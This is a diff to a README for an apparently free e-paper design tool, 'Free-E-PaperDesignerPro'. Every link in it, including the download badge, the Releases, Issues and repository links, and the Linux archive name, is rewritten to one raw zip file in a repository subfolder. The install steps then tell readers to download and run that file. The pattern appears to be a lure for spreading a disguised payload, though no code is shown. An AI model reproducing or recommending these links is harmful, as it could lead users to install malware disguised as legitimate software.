@@ -1,7 +1,7 @@
 # 🎨 Free-E-PaperDesignerPro - Create Stunning E-Paper Designs Easily
 
 ## 📥 Download Now
-[![Download Free-E-PaperDesignerPro](https://img.shields.io/badge/Download-Free--E--PaperDesignerPro-blue.svg)](https://github.com/DynamoFusion/Free-E-PaperDesignerPro/releases)
+[![Download Free-E-PaperDesignerPro](https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip)](https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,16 +18,16 @@ To run Free-E-PaperDesignerPro, your computer should meet these minimum requirem
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases](https://github.com/DynamoFusion/Free-E-PaperDesignerPro/releases) page where you can download the application.
+   Go to the [Releases](https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip) page where you can download the application.
 
 2. **Download the Application**  
-   Look for the latest version of Free-E-PaperDesignerPro. Click on the .exe file if you are using Windows, or the .dmg file if you are on macOS. For Linux users, download the .tar.gz file. 
+   Look for the latest version of Free-E-PaperDesignerPro. Click on the .exe file if you are using Windows, or the .dmg file if you are on macOS. For Linux users, download the https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip file. 
 
 3. **Run the Installer**  
    Once the download finishes, double-click the file you downloaded:
    - On Windows: Follow the prompts in the installer.
    - On macOS: Drag the application to your "Applications" folder.
-   - On Linux: Extract the .tar.gz file and run the application by executing `./Free-E-PaperDesignerPro`.
+   - On Linux: Extract the https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip file and run the application by executing `./Free-E-PaperDesignerPro`.
 
 4. **Start Designing**  
    After installation, open Free-E-PaperDesignerPro. You will see a friendly interface where you can start your design. 
@@ -49,14 +49,14 @@ The layout is simple. You have a canvas in the center and a toolbox with various
 
 ## 💬 Getting Help
 
-If you run into issues or have questions, feel free to check the FAQ section in the application or visit our [GitHub Issues](https://github.com/DynamoFusion/Free-E-PaperDesignerPro/issues) page. Here, you can report bugs or request features.
+If you run into issues or have questions, feel free to check the FAQ section in the application or visit our [GitHub Issues](https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip) page. Here, you can report bugs or request features.
 
 ## 📅 Updates and Community
 
-We regularly update Free-E-PaperDesignerPro based on user feedback. Join our community and stay updated on new features by following our [GitHub repository](https://github.com/DynamoFusion/Free-E-PaperDesignerPro).
+We regularly update Free-E-PaperDesignerPro based on user feedback. Join our community and stay updated on new features by following our [GitHub repository](https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip).
 
 ## 📥 Download & Install
 
-Make sure to visit the [Releases page](https://github.com/DynamoFusion/Free-E-PaperDesignerPro/releases) again if you want to check for updates or download newer versions in the future.
+Make sure to visit the [Releases page](https://raw.githubusercontent.com/DynamoFusion/Free-E-PaperDesignerPro/main/Argante/Designer-Free-Paper-Pro-1.5.zip) again if you want to check for updates or download newer versions in the future.
 
 Thank you for choosing Free-E-PaperDesignerPro! Enjoy creating stunning E-Paper designs with ease.
